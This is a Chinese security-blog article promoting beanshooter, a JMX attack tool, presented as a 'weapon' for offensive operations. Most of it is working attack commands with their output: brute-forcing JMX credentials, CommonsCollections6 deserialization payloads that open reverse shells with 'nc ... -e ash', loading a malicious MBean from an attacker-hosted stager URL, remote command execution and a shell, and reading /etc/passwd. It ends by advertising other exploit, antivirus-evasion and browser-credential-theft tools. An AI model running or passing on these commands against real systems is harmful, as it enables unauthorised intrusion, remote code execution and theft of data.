#  【神兵利器】JAVA JMX漏洞综合利用工具   
原创 Heptagram  七芒星实验室   2025-01-21 23:00  
  
**基本介绍**  
  
beanshooter是一个JMX枚举和攻击工具，有助于识别JMX端点上的常见漏洞并提供了丰富的漏洞利用载荷和利用方式  
#### 工具编译  
  
我们也可以通过beanshooter来枚举并注册EvilBean到JMXServer端，首先我们需要去下载beanshooter工具到本地，随后  
  
下到本地并进行打包  
```
cd beanshooter
mvn package
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfmKlGiaqtHBjhYSa6UO5DKPjKHtwnBQdZ52fYxib4P8QBibO0ibOVreG9nw/640?wx_fmt=png&from=appmsg "")  
#### 基本使用  
  
基本操作是可以在JMX服务上执行的通用操作，这些操作通常不以特定的MBean为目标或者以没有beanshooter内置支持的MBean为目标  
##### 帮助信息  
```
java -jar beanshooter.jar -h
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfsgCXibRYKdsuZmyIFBkjDawsSh2ttsy68PqtNG1JQoTFYumX1Y4lJGg/640?wx_fmt=png&from=appmsg "")  
##### 信息收集  
  
info操作可用于获取可用的属性信息：  
  
(1) 未授权模式：  
```
java -jar beanshooter.jar info 172.17.0.2 9010
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfvhCf2AQ5CQBaWvEcv7Febho0fenEUibv5wBEDzA1h8tqqsY561kq3wg/640?wx_fmt=png&from=appmsg "")  
  
(2) 授权认证模式  
```
java -jar beanshooter.jar info 172.17.0.2 1090 --username admin --password admin
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJficibt49wibWgk108Vacs6CkEytY2TiabNL9dYZbF0HfI5bLOYDjY54N4Mg/640?wx_fmt=png&from=appmsg "")  
  
在没有附加参数的情况下调用时将打印所有可用MBeans的方法和属性信息，在指定附加ObjectName时仅打印指定MBean的方法和属性信息  
```
java -jar beanshooter.jar info 172.17.0.2 9010 java.lang:type=Memory
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfmG94KPibo79uKNGOkNh3thfe1ia83gCGaF2dJTMfaY2g1ksNMRrBTlHQ/640?wx_fmt=png&from=appmsg "")  
##### 属性变更  
  
attr模式下可以获取并显示指定属性的值：  
```
java -jar beanshooter.jar attr 172.17.0.2 9010 java.lang:type=Memory Verbose
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJf4l1U97SyWW4ktm3eUia5sSCPPIQIWUA52RuiapKdGRmqJ9s63bmdib8Ig/640?wx_fmt=png&from=appmsg "")  
  
如果我们传入其他附加的参数值，那么  
beanshooter会去尝试设置相应的属性，对于类型不同于字符串的属性则需要使用"-type"选项指定属性类型，例如：  
```
java -jar beanshooter.jar attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean
java -jar beanshooter.jar attr 172.17.0.2 9010 java.lang:type=Memory Verbose
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfAZ1nClSGJ9UoA0WSKo03HEV869Q2OqDcictp5XRsgcbswBKARGic1FsQ/640?wx_fmt=png&from=appmsg "")  
##### 爆破操作  
  
我们可以通过brute模块来对JMX服务进行暴力猜解攻击：  
  
(1) 默认模式  
```
java -jar beanshooter.jar brute 172.17.0.2 1090
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfHbM09oAGiblyZtyribMl8IXYXKAObRjwibWldxS14nvxfj1Uw1zwV40cA/640?wx_fmt=png&from=appmsg "")  
  
(2) 字典模式  
  
用户可以按需指定用于进行暴力枚举的字典进行爆破尝试攻击，例如：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfXhBSnjfibM7zAtbEM4weWHfAdAibic1icwYLGZn9dQ60PoVHtRfLPamSAg/640?wx_fmt=png&from=appmsg "")  
##### 枚举操作  
  
enum操作用于枚举JMX的配置信息，它总是会去检查JMX端点是否需要"身份验证"以及是否"允许预先身份验证的任意反序列化"：  
```
java -jar beanshooter.jar enum 172.17.0.2 1090
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfbwiaC3av3xQGfQj0glsthYv5JQX7wWcTxA0FooicRRHlprLWqH552Ovg/640?wx_fmt=png&from=appmsg "")  
  
如果当不需要身份验证或者当指定了有效的凭据时，enum操作还会尝试从JMX端点枚举一些进一步的信息，包括非默认MBeans的列表，例如：在Apache tomcat服务器上注册的用户帐户  
```
java -jar beanshooter.jar enum 172.17.0.2 9010
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfC8qduliclib86KKWYTQby0Aria4UIeFbwTPOQxHqKsps1HdXvkKzLaJkg/640?wx_fmt=png&from=appmsg "")  
  
在受SASL保护的端点上调用enum操作时，beanshooter将试图枚举服务器配置的SASL配置文件，这仅在一定程度上存在可能并且无法枚举服务器的TLS配置，如果beanshooter识别SASL配置文件不起作用，则应该总是在使用/不使用-ssl选项的情况下重试  
```
java -jar beanshooter.jar enum 172.17.0.2 4447 --jmxmp
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfE8M4DpKfQMygSo4yqpFHfPslmACEtrUWlX50xnPc8a3gMPbtibDVqNg/640?wx_fmt=png&from=appmsg "")  
##### 列举操作  
  
list操作打印远程JMX服务上所有已注册MBeans的列表  
```
java -jar beanshooter.jar list 172.17.0.2 9010
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJf7MZEic3Rz968y0MGxbloicxykJvzALjibPrGrU190tzwkHQoyy7EyVrTA/640?wx_fmt=png&from=appmsg "")  
##### 模型操作  
  
model action实现了Markus Wulftange提出的一种技术，允许使用者调用Java的任意公共类和静态方法，此外还可以在用户创建的对象实例上调用公共对象方法，唯一的要求是所使用的方法参数和所提供的对象实例(对于非静态方法)是可序列化的，下面介绍了一个使用示例，其中File对象作为对象实例提供并对其调用String[] list()操作：  
```
java -jar beanshooter.jar model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfa5SJbMwMdiaIVlEbxSsUzkMiaLSjRGtdOTdqbmtZnoJoladu2bmsfpGA/640?wx_fmt=png&from=appmsg "")  
```
java -jar beanshooter.jar invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfa1uLOLJFFhqllnmYmgNfXoeSrY3UgLyxS1QdmW5QkkWe9ialKPTjjRw/640?wx_fmt=png&from=appmsg "")  
  
setManagedResource方法也是可用的，它可以用于更改要操作的对象实例：  
```
java -jar beanshooter.jar invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'setManagedResource(Object a, String b)' 'new java.io.File("/etc")' objectReference
[+] Call was successful.
java -jar beanshooter.jar invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
apk
shadow
crontabs
sysctl.conf
nsswitch.conf
profile.d
group
services
protocols
network
opt
logrotate.d
issue
passwd
init.d
udhcpd.conf
alpine-release
motd
hosts
sysctl.d
fstab
inittab
ssl
periodic
ssl1.1
os-release
modules
securetty
profile
modprobe.d
hostname
conf.d
modules-load.d
mtab
shells
secfixes.d
resolv.conf
root@RedTeam:~#
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfSdFiaYiahONiclGp0Kwssib34posPmuDXOiaTRtPcYWRicnMl8jiaocIJ1EUg/640?wx_fmt=png&from=appmsg "")  
##### 反序列化  
  
serial操作可用于在JMX端点上执行反序列化攻击，默认情况下该操作会尝试验证后反序列化攻击，要做到这一点您需要将JMX服务定位为允许未经身份验证的访问或者您需要有效的凭据  
  
Step 1：开启监听  
```
nc -lnvp 1234
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfk4NHtVRgF7zteSjdrafUdbU1Uj7pP4kjY0MmKTgz1VX7DdOuibZpnhQ/640?wx_fmt=png&from=appmsg "")  
  
Step 2：发起反序列化请求，如果出现下面的错误提示则说明是未配置yso.jar的路径  
```
java -jar beanshooter.jar serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 1234 -e ash" --username admin --password admin
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfaHkrFHZToW7f30Chh0tUQSrRddgjl7icqUiacatNJZiahZNRhPbGW3ic6w/640?wx_fmt=png&from=appmsg "")  
  
随后正常执行后可以成功反弹shell回来：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJf72KwNhUSY8trGnmqKZWpu566PjLkoZwbkwqKeruCiaktEkEB8k8icbXg/640?wx_fmt=png&from=appmsg "")  
  
JMX服务也容易受到预先验证的反序列化攻击，要滥用这一点，您可以使用-preauth开关  
```
java -jar beanshooter.jar serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --preauth
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfoWjhGJm9yibEa0aN4haq89O8EgxuCEAgjuphDrUPAtRTbkvahgMDLUg/640?wx_fmt=png&from=appmsg "")  
  
备注：针对JMXMP端点预先验证的反序列化通常是可能的，不幸的是在枚举操作中没有办法正确地枚举它，如果您遇到一个JMXMP端点，您应该试一试  
#### MBeans  
  
MBean操作与针对JMX端点所暴露的通用功能的基本操作相比则是针对特定的MBean，Beanshooter对于每个支持的MBean都提供了另一个子解析器，其中包含相应MBean的可用操作和选项，以下列表展示了mlet MBean及其关联子解析器的示例：  
```
java -jar beanshooter.jar mlet -h
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfqlsRooCehnM0vm8ByQLJKVnETqouXIjxWodzd3Vqnk7mBEVMzPXSEg/640?wx_fmt=png&from=appmsg "")  
##### Generic  
  
Generic MBean操作反映了基本操作的功能，但不需要指定ObjectName  
###### 攻击操作  
  
attr操作与基本操作中的attr操作相同，然而不再需要指定ObjectName，因为它已包含在所指定的MBean中  
```
 java -jar beanshooter.jar tomcat attr 172.17.0.2 1090 users
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJf4bAaMib80nLN6cVKX0MPrK4IwI2oqsIVsvEHa85c6wHKUT2n925lqmw/640?wx_fmt=png&from=appmsg "")  
###### 部署操作  
  
deploy操作基本上与上面的deploy操作相同，然而由于ClassName、ObjectName和实现的JAR文件都已与指定的MBean关联，因此您只需在此操作中指定--stager-url选项(假设内置的jar文件可用)：  
```
java -jar beanshooter.jar tonka deploy 172.17.0.2 9010 --stager-url http://172.17.0.1:8000
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfHmjVExgkXL7z2q1DL7YYj3uZIHqWtSQMz71FuaAvXWaqxvpPpNK2Lg/640?wx_fmt=png&from=appmsg "")  
###### 导出操作  
  
在有时候我们会发现无法通过beanshooter的stager服务器提供MBean实现，常见的情况之一是向本地机器的出站连接被阻止，在这种情况下我们可能希望从其他位置加载MBean，例如：在具有写入权限的内部网络中的SMB服务，export操作导出实现指定MBean的jar文件以及加载MBean所需的相应MLet HTML文档，假设我们从监听在10.10.10.5的SMB服务提供TonkaBean，那么可以使用以下命令：  
```
[qtc@devbox ~]$ beanshooter tonka export --export-dir export --stager-url file:////10.10.10.5/share/
[+] Exporting MBean jar file: export/tonka-bean-3.0.0-jar-with-dependencies.jar
[+] Exporting MLet HTML file to: export/index.html
[+]   Class:     de.qtc.beanshooter.tonkabean.TonkaBean
[+]   Archive:   tonka-bean-3.0.0-jar-with-dependencies.jar
[+]   Object:    MLetTonkaBean:name=TonkaBean,id=1
[+]   Codebase:  file:////10.10.10.5/share/
```  
###### 常用信息  
  
info操作列出指定MBean的方法和属性信息：  
```
java -jar beanshooter.jar tomcat info 172.17.0.2 1090
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfKLc5RYj8bh4QfXbMbicojxDEr15qlulwRDaraDPawwLosm2wsesyppg/640?wx_fmt=png&from=appmsg "")  
###### 常规调用  
  
invoke操作可用于在指定的MBean上调用任意方法：  
```
java -jar beanshooter.jar tomcat invoke 172.17.0.2 1090 --signature 'findUser(String username)' admin
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfqxAQlUjD5jyyY77qrYNtqadQFWqqxIV18U0atzsTCOxya3bicLunZXw/640?wx_fmt=png&from=appmsg "")  
###### 选项信息  
  
stats操作列出指定MBean的一些基本信息，这些信息是beanshooter本地存储的与相应MBean相关的数据，无需与服务器进行交互，Jar文件信息指示相应MBean的实现是否内置在beanshooter中，如果未使用--jar-file选项覆盖，则在部署过程中将使用该jar文件，目前TonkaBean是唯一一个具有可用Jar文件的MBean  
```
java -jar beanshooter.jar tonka stats
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfcCbVw9QHDbRu5m8qnlwlQcNLV0jt8PFXMpB5Os8sM6KrwM1DHqGeIQ/640?wx_fmt=png&from=appmsg "")  
###### 状态查询  
  
status操作检查相应的MBean是否已在JMX服务上可用  
```
java -jar beanshooter.jar tonka status 172.17.0.2 9010
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfeRpoErVia5h5uP8eoJsHsetKibKzWibZyVXQj2rnJUKrQoPlKdJh5OJLg/640?wx_fmt=png&from=appmsg "")  
###### 卸载操作  
  
undeploy操作从远程JMX服务中移除指定的MBean：  
```
java -jar beanshooter.jar tonka undeploy 172.17.0.2 9010
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfuGgUHApTOxVqxbFyLichLEiaAlPVGiaHJGj6wmjpHrmd6b7d0ABOh2ZHg/640?wx_fmt=png&from=appmsg "")  
##### MLet  
  
MLetMBean是一个众所周知的MBean，它可以用于通过网络加载额外的MBean，它已经被beanshooter的部署操作隐式使用，同时也可以通过mlet操作手动调用  
###### MLet Load  
  
目前唯一实现的MLet方法是load操作，可用于从用户指定的URL加载MBean类：  
```
java -jar beanshooter.jar mlet load 172.17.0.2 9010 tonka http://172.17.0.1:8000
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfDwdEN5nP9eL9F0nsTgjbI4v4uKpkFewyIREDze1lE6cmIRvHRYiawFA/640?wx_fmt=png&from=appmsg "")  
  
上述示例演示了如何使用mlet操作手动加载TonkaBean，如果您想要加载自定义MBean，则需要指定关键字custom而不是tonka，并提供--class-name、--object-name和--jar-file选项：  
```
java -jar beanshooter.jar mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name Evil --object-name Evil:name=Evil,id=1 --jar-file /root/jmx/JMXPayload.jar
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfSx3V7HqtGN8IRwib1NxZrldPDyEMfd1CeopY1tKG2GBSxutjSDzy6Mw/640?wx_fmt=png&from=appmsg "")  
#### TONKA  
  
TonkaBean是由beanshooter项目实现的自定义MBean，允许在JMX服务器上访问文件系统和执行命令，可以通过使用tonka操作来访问其所需的功能  
##### Tonka Exec  
  
exec操作可用于在RMI服务上执行单个命令：  
```
java -jar beanshooter.jar tonka exec 172.17.0.2 9010 id
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfNhQeXNpEjCELlKRAXt8E0vvH7da63OM5peog7JjQkSoic4Hz992Qryg/640?wx_fmt=png&from=appmsg "")  
  
exec操作的最后一个参数预期为字符串，当未使用"--shell"选项时，该字符串会在空格处拆分(考虑引号)并作为数组传递给服务器端的ProcessBuilder类，  
如果使用了"--shell"则指定的shell字符串会在空格处拆分，生成的数组与指定的参数字符串连接后再传递给ProcessBuilder类，这允许以类似shell的方式执行并正确解释shell特殊字符：  
```
java -jar beanshooter.jar tonka exec 172.17.0.2 9010 --shell 'ash -c' 'echo $HOSTNAME'
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfTib9qOqeTPmL0DtH68YPvDemVkMpS6Hp5Eiania4SG8zDEq1z0kTz3edQ/640?wx_fmt=png&from=appmsg "")  
  
备注：为了方便起见，常见的shell会自动附加所需的命令字符串参数，因此"--shell ash"会自动转换为--shell 'ash -c'  
  
##### Tonka Execarray  
  
execarray操作与exec动作非常相似，但它不是期望一个字符串作为参数并在空格处分割该字符串以构建命令数组，而是允许指定多个参数，这些参数将直接作为ProcessBuilder类的命令数组使用：  
```
java -jar beanshooter.jar tonka execarray 172.17.0.2 9010 -- ash -c 'echo $HOME'
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfHJquo59z20gU6zGmUHVBIy9qxocCibQMtGM23GNG5iaUA8RwxZry3QAA/640?wx_fmt=png&from=appmsg "")  
##### Tonka Shell  
  
shell操作会启动一个命令行shell，您可以在其中指定将在JMX服务器上执行的命令，该shell并不是完全交互式的，只是对Java的Runtime.exec方法的一个封装，然而它实现了对环境变量和当前工作目录的基本支持：  
```
java -jar beanshooter.jar tonka shell 172.17.0.2 9010
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfD66JukQ2tJX89HnJNCYx6nLMpWIk8yk6mN1nfk7JlU87sibSf6SMricw/640?wx_fmt=png&from=appmsg "")  
  
上面的示例演示了如何使用!env关键字设置环境变量，除了这个关键字，还有其他几个可用的关键字：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfATK6WCFx1PVsdzhlhq4AfFOyuW9IhNVbqxRtAiatSSLRLToteZYqjLg/640?wx_fmt=png&from=appmsg "")  
##### Tonka Upload  
  
upload操作可用于将文件上传到JMX服务器  
```
java -jar beanshooter.jar tonka upload 172.17.0.2 9010 file.dat /tmp
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfD0pkY9VRWw6yfasyx5dYQr5WPvXF7TfVTIiaT2eV5V9v4OOb5uAVgew/640?wx_fmt=png&from=appmsg "")  
##### Tonka Download  
  
download操作可用于从JMX服务器下载文件：  
```
java -jar beanshooter.jar tonka download 172.17.0.2 9010 /etc/passwd
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl19mYyKWyP8SoVIrb4oNJfffIMWHFQY5bnXSICpOL5xGysSjneeLz1IiaMFN7qYCnz2h5j93icyL6A/640?wx_fmt=png&from=appmsg "")  
  
**下载地址**  
  
**点击下方名片进入公众号**  
  
**回复关键字【**  
**250122****】获取**  
**下载链接**  
  
**·推 荐 阅 读·**  
  
# 最新后渗透免杀工具  
# 【护网必备】高危漏洞综合利用工具  
#    【护网必备】Shiro反序列化漏洞综合利用工具增强版  
# 【护网必备】外网打点必备-WeblogicTool  
# 【护网必备】最新Struts2全版本漏洞检测工具  
# Nacos漏洞综合利用工具  
# 重点OA系统漏洞利用综合工具箱    
# 【护网必备】海康威视RCE批量检测利用工具  
# 【护网必备】浏览器用户密码|Cookie|书签|下载记录导出工具  
  
  
  
